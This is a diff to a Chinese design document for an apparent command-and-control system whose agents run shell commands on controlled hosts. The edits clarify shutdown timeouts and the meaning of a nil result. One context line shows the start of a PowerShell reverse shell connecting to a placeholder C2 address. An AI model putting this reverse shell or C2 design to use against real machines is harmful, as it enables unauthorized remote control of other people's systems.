@@ -437,7 +437,8 @@ shell -> C2:      <交互式回显，若有>
 ### 6.5 在线与关闭
 
 - **无心跳**：连接存在即在线；socket 关闭即从注册表移除。
-- **shutdown**：向 shell 写入 `exit`。
+- **shutdown**：向 shell 写入 `exit`；1 秒内未关闭则强制断开。成功仅表示请求已写入本地连接、
+  本地 shutdown 流程完成，不表示对端已收到或执行。
 
 ---
 
@@ -490,7 +491,8 @@ type Backend interface {
     Upload(ctx context.Context, localPath, destPath string) (string, error)
     // Download：两类受控端统一落到 <destDir>/<basename(srcPath)>，已存在则覆盖
     Download(ctx context.Context, srcPath, destDir string) (string, error)
-    // Shutdown 关闭受控端进程/连接
+    // Shutdown 关闭受控端进程/连接；必须在有界时间内返回（不依赖对端响应）。
+    // nil 仅表示请求已写入本地连接且本地流程完成，不表示远端确认。
     Shutdown(ctx context.Context) error
     // Close 关闭底层连接（watchdog / 主动断开）
     Close() error
@@ -806,6 +808,10 @@ if err := stream.Err(); err != nil { /* 网络 / 接口错误 */ }
 | 执行中（dispatcher 已取出） | **是** | `context.WithTimeout(job.ctx, cmd_timeout)` 包裹 Backend 调用 |
 
 > C2 的每次网络写另有 **10 秒写超时**，防止对端停止读取时 dispatcher 被阻塞而绕过上述超时。
+>
+> `Shutdown` 是例外：它是一次性本地操作，不等待远端响应；Native / Shell 都必须在有界时间内返回
+> （10 秒写超时 + 1 秒宽限）。`waitJob` 只对“已开始的 shutdown”在 Agent 关闭后继续等待结果，
+> 其余 Job 仍按 Agent 关闭处理；shutdown 的 nil 结果表示“已写入且本地流程完成”，不代表远端确认。
 
 执行超时后的处理由 `policy.timeout_action` 决定：
 
@@ -1110,6 +1116,9 @@ powershell -NoProfile -Command "$c=New-Object Net.Sockets.TCPClient('<C2_IP>',88
 | 安全拦截 | `CheckSafety` 失败 | tool 结果 `Error: blocked by safety check` |
 | 用户拒绝 | 授权被拒 | 动作**不下发**；tool 结果 `Error: user denied command execution (not executed)`，**结束本轮** |
 | 解析失败 | tool arguments 非法 JSON | tool 结果返回解析错误提示，让模型纠正 |
+
+> Shutdown 的成功（nil）仅表示关机请求已写入本地连接且本地 shutdown 流程完成；
+> 受控端执行状态不可知，不表示远端已确认收到或执行。
 
 ---
 
